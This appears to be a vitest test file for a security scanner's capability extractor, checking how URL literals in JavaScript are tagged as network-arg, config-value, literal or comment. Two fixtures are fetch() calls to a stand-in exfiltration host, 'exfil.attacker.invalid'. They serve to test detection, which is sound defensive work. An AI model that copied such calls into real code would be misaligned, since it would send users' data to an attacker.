import { describe, it, expect } from 'vitest';
import { extractCapabilities } from '../src/capabilities.js';

function cap(src: string, filePath = 'a.js') {
  return extractCapabilities(filePath, src, 'sha256-fake', src.length);
}

// v0.5.0 URL AST context tracking (FP-STUDY §3b follow-up). See
// packages/core/src/capabilities.ts extractCapabilities() and
// packages/detectors/src/net.ts collectUrls()/severityForContext().
describe('urlLiteralContexts', () => {
  it('tags a URL passed directly to fetch() as network-arg', () => {
    const c = cap(`fetch('https://exfil.attacker.invalid/data');`);
    expect(c.urlLiteralContexts?.['https://exfil.attacker.invalid/data']).toBe('network-arg');
  });

  it('tags a URL assigned to a config-shaped key as config-value', () => {
    const c = cap(`const opts = { url: 'https://api.example.com' };`);
    expect(c.urlLiteralContexts?.['https://api.example.com']).toBe('config-value');
  });

  it('tags a URL in a plain variable assignment as literal', () => {
    const c = cap(`const s = 'https://docs.example.com/faq';`);
    expect(c.urlLiteralContexts?.['https://docs.example.com/faq']).toBe('literal');
  });

  it('tags a URL that only appears in a comment as comment', () => {
    const c = cap(`// see https://docs.example.com for details\nconst x = 1;`);
    expect(c.urlLiteralContexts?.['https://docs.example.com']).toBe('comment');
  });

  it('tags a URL in a template literal passed to fetch() as network-arg', () => {
    const c = cap('fetch(`https://exfil.attacker.invalid/data`);');
    expect(c.urlLiteralContexts?.['https://exfil.attacker.invalid/data']).toBe('network-arg');
  });

  it('tags a URL in a plain template literal as literal', () => {
    const c = cap('const s = `https://docs.example.com/faq`;');
    expect(c.urlLiteralContexts?.['https://docs.example.com/faq']).toBe('literal');
  });

  it('recognizes network-arg via a MemberExpression callee (axios.get)', () => {
    const c = cap(`axios.get('https://api.example.com/v1/data');`);
    expect(c.urlLiteralContexts?.['https://api.example.com/v1/data']).toBe('network-arg');
  });

  it('takes the highest-signal context when the same URL appears in multiple contexts', () => {
    const c = cap(
      `// see https://api.example.com for details\nfetch('https://api.example.com');`,
    );
    expect(c.urlLiteralContexts?.['https://api.example.com']).toBe('network-arg');
  });

  it('leaves urlLiteralContexts undefined-per-key for package.json (no AST pass)', () => {
    const c = cap(
      JSON.stringify({ name: 'x', homepage: 'https://example.com' }),
      'package.json',
    );
    // package.json is skipped entirely for URL extraction.
    expect(c.urlLiterals).toEqual([]);
    expect(c.urlLiteralContexts).toBeUndefined();
  });
});
